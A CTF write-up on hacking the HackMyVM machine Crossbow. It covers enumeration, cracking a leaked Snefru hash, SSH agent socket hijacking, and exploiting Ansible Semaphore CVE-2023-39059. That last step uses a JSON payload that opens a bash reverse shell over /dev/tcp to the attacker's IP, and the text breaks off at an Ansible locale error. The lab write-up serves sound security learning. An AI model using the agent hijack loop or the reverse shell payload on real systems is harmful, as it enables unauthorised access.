---
title: Write-up Crossbow on HackMyVM
author: eMVee
date: 2023-12-24 08:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, ssh hijack, ssh agent hijacking, ansible, ansible semaphore, CVE-2023-39059]
render_with_liquid: false
---
Finally I succeeded in hacking the machine Crossbow. A medium vulnerable machine hosted on HackMyVM and created by cromiphi. The first version had some problems with successful SSH hijacking. The second version that is now shared on the website does not have this problem. Capturing the last flag took longer than expected. I received all kinds of error messages about invalid local settings. When I tried to solve this locally it didn't work as I want to. Thanks to 0xH3rshel and sML I understood that I had overlooked a small thing for running tasks with an environment parameter. This is something I didn't know yet because I haven't worked with ansible before.

## Getting started
First we should create our project directory. This is used so we can store any information or exploits in this directory.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV            

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir Crossbow  

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd Crossbow 
```
We should verify our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 446sec preferred_lft 446sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:77:a3:c5:c2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```
Next we would have to identify our target on our virtual environment. There are different ways to do this. But in this case fping is my favorite.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.5
10.0.2.9
```
Since we know our own IP address we are able to identify the targets IP address. Next we should assign the IP address to a variable so we could copy and paste commands from our notes.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ ip=10.0.2.9

```

## Enumeration
Since everything is set, we can start with enumeration. We should identify open ports, running services and if possible with the version number shown. We can use nmap to get started collecting all information we want to.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ sudo nmap -sC -sV $ip -p- -T4 -A
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-24 06:10 CET
Nmap scan report for 10.0.2.9
Host is up (0.00036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp   open  http        Apache httpd 2.4.57 ((Debian))
|_http-title: Polo's Adventures
|_http-server-header: Apache/2.4.57 (Debian)
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     X-Frame-Options: sameorigin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|_    font-weight: 300;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.94%I=7%D=12/24%Time=6587BD4B%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,DB1,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS-Pre
SF:fetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-T
SF:ype-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-origin
SF:\r\nX-Frame-Options:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<ht
SF:ml>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc2c\r\n<
SF:/title>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20conten
SF:t=\"text/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"vie
SF:wport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20
SF:\x20\x20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20font-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica
SF:,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20")%r(HTTPOptions,DB1,"HTT
SF:P/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20
SF:off\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nCross-Origin-Resource-Policy:\x20same-origin\r\nX-Frame-Option
SF:s:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\
SF:x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc2c\r\n</title>\n\x20\x20\
SF:x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20
SF:charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content
SF:=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<style
SF:>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:
SF:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x2
SF:0\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20san
SF:s-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2
SF:012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x2
SF:01\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x
SF:20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-
SF:color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20verti
SF:cal-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20p\x20");
MAC Address: 08:00:27:F5:B7:0C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 10.0.2.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.72 seconds
                                                                   

```
When the nmap job is finished we should look into the results carefully and take some notes.
- Operating system, probably Debian
- Port 22
	- SSH
	- OpenSSH 9.2p1 Debian 2 
- Port 80
	- HTTP
	- Apache 2.4.57
	- Title: Polo's Adventures]
- Port 9090
	- Zeus-admin

Let's add the machine to our `/etc/hosts` file. This could be useful for other enumeration tools.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ sudo nano /etc/hosts   

┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.0.2.9        crossbow.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

The service name 'zeus-admin' looks interesting based on the 'admin' port. Let's visit this webpage.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213154758.png){: width="700" height="400" }


We don't have any credentials yet, so let's skip this part for the moment.
Whatweb could perhaps discover some information what we have not seen earlier.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ whatweb http://$ip
http://10.0.2.9 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.0.2.9], Script, Title[Polo's Adventures]

```

Let's visit the website and gather some more information
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213154338.png){: width="700" height="400" }


On the website it looks like Polo might be a person. So this might be an username what we should add to our notes.
- Polo

We can use nikto to identify any known issues on a webservice or web application. 
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ nikto -h $ip 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.9
+ Target Hostname:    10.0.2.9
+ Target Port:        80
+ Start Time:         2023-12-24 06:18:11 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 1455, size: 60575d67a7363, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-12-24 06:18:27 (GMT1) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
We did not discover anything useful for us now. We should keep going and start enumerating for directories and files. First we should assign the URL to a variable 'url' so we can use this in our commands.
```bash
┌──(emvee㉿kali)-[~]
└─$ url=http://crossbow.hmv
```

Since we are ready to enumerate directories and files we can start dirsearch to search for all those juicy information.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ dirsearch -u $url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                        
 (_||| _) (/_(_|| (_| )                                                                                           
Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/crossbow.hmv/_23-12-24_06-21-52.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-12-24_06-21-52.log

Target: http://crossbow.hmv/

[06:21:52] Starting: 
[06:27:19] 403 -  277B  - /server-status                                    

Task Completed  

```

Well, there are not really much details found with dirsearch. Let's try another tool, maybe feroxbuster will help us find something.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ feroxbuster --url $url -x php,txt,html,ba

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://crossbow.hmv
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, ba]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       32w      321c http://crossbow.hmv/config.js
200      GET       21l       50w      760c http://crossbow.hmv/app.js
200      GET      160l      491w     5205c http://crossbow.hmv/
200      GET      160l      491w     5205c http://crossbow.hmv/index.html
[####################] - 27s   150010/150010  0s      found:4       errors:0      
[####################] - 26s   150000/150000  5685/s  http://crossbow.hmv/   
```
There are two JavaScript files identified by feroxbuster. One of them has the name `config.js`. This makes me wonder what information we could find here. Let's check them with curl.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ curl http://crossbow.hmv/config.js
const API_ENDPOINT = "https://phishing.crossbow.hmv/data";
const HASH_API_KEY = "49ef6b765d39f06ad6a20bc951308393";

// Metadata for last system upgrade
const SYSTEM_UPGRADE = {
    version: "2.3.1",
    date: "2023-04-15",
    processedBy: "SnefruTools V1",
    description: "Routine maintenance and security patches"
}
```
We have discovered three interesting details:
- An endpoint `https://phishing.crossbow.hmv/data`
- A hash for an API key `49ef6b765d39f06ad6a20bc951308393`
- Processed by: SnefruTools v1

Let's add both to our notes. We should check the other JavaScript as well with curl.
```
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ curl http://crossbow.hmv/app.js   
document.addEventListener("DOMContentLoaded", function() {
    fetch(API_ENDPOINT, {
        headers: {
            "Authorization": `Bearer ${API_KEY}`
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && Array.isArray(data.messages)) {
            const randomMessage = data.messages[Math.floor(Math.random() * data.messages.length)];

            const messageElement = document.createElement("blockquote");
            messageElement.textContent = randomMessage;
            messageElement.style.marginTop = "20px";
            messageElement.style.fontStyle = "italic";

            const container = document.querySelector(".container");
            container.appendChild(messageElement);
        }
    });
});

```

We did not discover other juicy details in the JavaScript file. We have identified a hash and something mentioning processed by `SnefruTools v1`

Since I don't have any idea what this tool is, I should have to do a bit of research.

```
https://www.google.com/search?q=Snefru+Tools
```

The first three results are about hashes..
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224065608.png){: width="700" height="400" }


We can then search for `Snefru hash decrypt` on Google.
```
https://www.google.com/search?q=Snefru+hash+decrypt
```
On of the first hits on Google is:
```
https://md5hashing.net/hash/snefru
```
On this website we can enter the hash and decode it.

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224070135.png){: width="700" height="400" }


After a few seconds we got an hit.
```
https://md5hashing.net/hash/snefru/49ef6b765d39f06ad6a20bc951308393 
```

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213163645.png){: width="700" height="400" }


The plaintext is: `ELzkRudzaNXRyNuN6`, this might be a potential password.
## Initial access
We might try to logon to the service on port 9090 with the username `polo` and this potential password.


![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213164259.png){: width="700" height="400" }

We were able to successful logon to the web portal with the username polo. On the left bottom we can see there is a button `terminal`. Let's inspect this first.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213164655.png){: width="700" height="400" }


Let's create a list for all users present on the system.
```bash
polo@crossbow:~$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
lea
polo
pedro
```

There are three users on the system. We should add those to our notes as well.
Let's check some basic information about the system.
```bash
polo@crossbow:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
polo@crossbow:~$ hostname
crossbow
polo@crossbow:~$ uname -a
Linux crossbow 6.1.0-15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.66-1 (2023-12-09) x86_64 GNU/Linux
polo@crossbow:~$ uname -mrs
Linux 6.1.0-15-amd64 x86_64
polo@crossbow:~$ cat /etc/issue
Debian GNU/Linux 12 \n \l

polo@crossbow:~$ 
```
We have discovered some information what we should add to our notes: 
- Linux: Debian 12
- Kernel 6.1.0-15-amd x86_64
- Another IP address: 172.17.0.2
Based on this information we are probably working on a container.

Now we should move to the `/tmp` directory. This directory is writeable for anyone and we can download here our scripts and tools to enumerate more. Let's first check what is already on this directory.

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231213170605.png){: width="700" height="400" }

It looks like there are some SSH directories in the `/tmp` directory.

We should do a bit of research on Google on those directory names.
```
https://www.google.com/search?q='ssh-XXXXXX
```
One of the results tells us that we are talking about a ssh-agent.
```
https://askubuntu.com/questions/979911/strange-folder-in-tmp-with-name-ssh
```

Since this directory contains some interesting ssh-agent directories we should find out what processes are running on this system. We can use the command `ps -aux` to identify processes running by `lea` for example.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224072500.png){: width="700" height="400" }


There are some processes running as Lea on the system. We might be able to execute a SSH agent hijack. [SSH Hijacking](https://n3dx0o.medium.com/understanding-ssh-agent-and-ssh-agent-hijacking-a-real-life-scenario-2522475f7d8e) is a technique to leverage an existing SSH session to SSH into another machine. In order to access an SSH server (which uses public-key authentication) through another server, the private key is not kept on the server. Instead, ssh-agent forwarding is performed on the client machine. The SSH agent socket will be available on the server and can be used to authenticate with the other SSH server via the ssh-agent running on the client machine.

When we search for `'ssh-XXXXXX' ssh hacktricks` on Google we can find an article on hacktricks about ['SSH Agent forward exploitation'](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation).



```bash
for i in {1070..1110}; do SSH_AUTH_SOCK=ssh-XXXXXXKvFHFm/agent.$1 ssh pedro@10.0.2.9; done
```

```bash
polo@crossbow:/tmp$ for i in {1080..1090}; do SSH_AUTH_SOCK=ssh-XXXXXXKvFHFm/agent.$i ssh pedro@10.0.2.9; done
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
Permission denied, please try again.
pedro@10.0.2.9's password: 
pedro@10.0.2.9: Permission denied (publickey,password).

Last login: Sun Dec 24 10:45:51 2023 from 172.17.0.2

╭─pedro@crossbow ~ 
╰─$ 
```

Since we are `pedro `now on crossbow we should capture the user flag.

```bash
╭─pedro@crossbow ~ 
╰─$ ls
user.txt
╭─pedro@crossbow ~ 
╰─$ cat user.txt       
HERE IS THE USER FLAG
```

Since we are working on a 'new' system we should enumerate again from the beginning. As first we should check on what kind of system we are working. Is this machine still a Debian

```
╭─pedro@crossbow ~ 
╰─$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
pedro
╭─pedro@crossbow ~ 
╰─$ uname -a
Linux crossbow.hmv 6.1.0-15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.66-1 (2023-12-09) x86_64 GNU/Linux
╭─pedro@crossbow ~ 
╰─$ uname -mrs
Linux 6.1.0-15-amd64 x86_64
╭─pedro@crossbow ~ 
╰─$ cat /proc/version
Linux version 6.1.0-15-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.66-1 (2023-12-09)
╭─pedro@crossbow ~ 
╰─$ cat /etc/issue
Debian GNU/Linux 12 \n \l

╭─pedro@crossbow ~ 
╰─$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
╭─pedro@crossbow ~ 
╰─$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
╭─pedro@crossbow ~ 
╰─$ 
```
Now we should enumerate some information about the user(s).
```
╭─pedro@crossbow ~ 
╰─$ id  
uid=1002(pedro) gid=1002(pedro) groups=1002(pedro),100(users)
╭─pedro@crossbow ~ 
╰─$ grep '^sudo:.*$' /etc/group | cut -d: -f4

╭─pedro@crossbow ~ 
╰─$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
╭─pedro@crossbow ~ 
╰─$ who                                                                                                                                                                         
pedro    pts/0        2023-12-20 13:17 (172.17.0.2)
╭─pedro@crossbow ~ 
╰─$ w  
 13:30:22 up  1:27,  1 user,  load average: 1.61, 1.51, 1.40
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pedro    pts/0    172.17.0.2       13:17    3.00s  1.62s   ?    w
```

Let's find out if there are any internal service open  and running with
```bash
ss -ant
```

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224105629.png){: width="700" height="400" }

There are two ports listening internally. One of them is a MySQL service probably. The service on port 3000 is not known by me. We should try to see what is running here with curl.
```bash
curl http://127.0.0.1:3000
```

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224105919.png){: width="700" height="400" }


In the Title we can discover that this is hosting `Ansible Semaphore`.
## Privilege escalation
While searching for Ansible Semaphore in combination with privilege escalation I came a cross this [blog](https://www.alevsk.com/2023/07/a-quick-story-of-security-pitfalls-with-execcommand-in-software-integrations/).


Let's find out what version of semaphore is used. First we should check the help function to determine how we can check the version.
```bash
╭─pedro@crossbow ~ 
╰─$ semaphore -h                                                                        
Ansible Semaphore is a beautiful web UI for Ansible.
Source code is available at https://github.com/ansible-semaphore/semaphore.
Complete documentation is available at https://ansible-semaphore.com.

Usage:
  semaphore [flags]
  semaphore [command]

Available Commands:
  completion  generate the autocompletion script for the specified shell
  help        Help about any command
  migrate     Execute migrations
  server      Run in server mode
  setup       Perform interactive setup
  upgrade     Upgrade to latest stable version
  user        Manage users
  version     Print the version of Semaphore

Flags:
      --config string   Configuration file path
  -h, --help            help for semaphore

Use "semaphore [command] --help" for more information about a command.
```

Now we can check the version.
```bash
╭─pedro@crossbow ~ 
╰─$ semaphore version 
v2.8.90
```
This version has a known vulnerability CVE-2023-39059 and is explained in the blog.
Now let's setup the service.

```bash
╭─pedro@crossbow ~ 
╰─$ semaphore setup   

Hello! You will now be guided through a setup to:

1. Set up configuration for a MySQL/MariaDB database
2. Set up a path for your playbooks (auto-created)
3. Run database Migrations
4. Set up initial semaphore user & password

What database to use:
   1 - MySQL
   2 - BoltDB
   3 - PostgreSQL
 (default 1): 1

db Hostname (default 127.0.0.1:3306): 

db User (default root): admin

db Password: admin

db Name (default semaphore): 

Playbook path (default /tmp/semaphore): 

Web root URL (optional, see https://github.com/ansible-semaphore/semaphore/wiki/Web-root-URL): 

Enable email alerts? (yes/no) (default no): 

Enable telegram alerts? (yes/no) (default no): 

Enable slack alerts? (yes/no) (default no): 

Enable LDAP authentication? (yes/no) (default no): 

Config output directory (default /home/pedro): 

Running: mkdir -p /home/pedro..
Configuration written to /home/pedro/config.json..
 Pinging db..
Running db Migrations..


 > Username: admin
 > Email: 

 Welcome back, admin! (a user with this username/email is already set up..)

 Re-launch this program pointing to the configuration file

./semaphore server --config /home/pedro/config.json

 To run as daemon:

nohup ./semaphore server --config /home/pedro/config.json &

 You can login with  or admin.
```
Now let's make port 3000 public available via port 3001 with socat.
```bash                                                                                 
╭─pedro@crossbow ~ 
╰─$  socat TCP-LISTEN:3001,fork TCP:127.0.0.1:3000 
```

We now should visit the website on port 3001
```
http://crossbow.hmv:3001
```
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224111313.png){: width="700" height="400" }

We can try to logon to the application with the user `admin` and the password `admin` what we have setup in previous steps.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224111522.png){: width="700" height="400" }

The logon was successful, now we should browse the web application so we can discover what we can do. In the blog they described we could exploit it via the `environment` settings. Let's start over there.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224111652.png){: width="700" height="400" }

There is sample data available. Let's edit this for our needs.

According the blog we should use this json code to gain a reverse shell.

```
{
  "ansible_user": "{{ lookup('ansible.builtin.pipe', \"bash -c 'exec bash -i &>/dev/tcp/10.0.2.5/1234 <&1'\") }}"
}
```


![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224111842.png){: width="700" height="400" }

After saving the new configuration we should start a netcat listener on our system.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Crossbow]
└─$ rlwrap nc -lvp 1234
listening on [any] 1234 ...

```

Now we should navigate to the `Task Templates`.
![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224112015.png){: width="700" height="400" }

Since there is only one task present we can click on the `RUN` button

![image](/assets/img/WriteUp/HackMyVM/Crossbow/Pasted image 20231224112140.png){: width="700" height="400" }

One more click on `RUN` button and let's see if there is a reverse shell established.

```
 11:21:32 AM
Task 98 added to queue
11:21:34 AM
Preparing: 98
11:21:34 AM
Prepare TaskRunner with template: clean logs
11:21:34 AM
installing static inventory
11:21:34 AM
No collections/requirements.yml file found. Skip galaxy install process.
11:21:34 AM
No roles/requirements.yml file found. Skip galaxy install process.
11:21:39 AM
Started: 98
11:21:39 AM
Run TaskRunner with template: clean logs
11:21:39 AM
ERROR: Ansible could not initialize the preferred locale: unsupported locale setting
11:21:39 AM
Running playbook failed: exit status 1
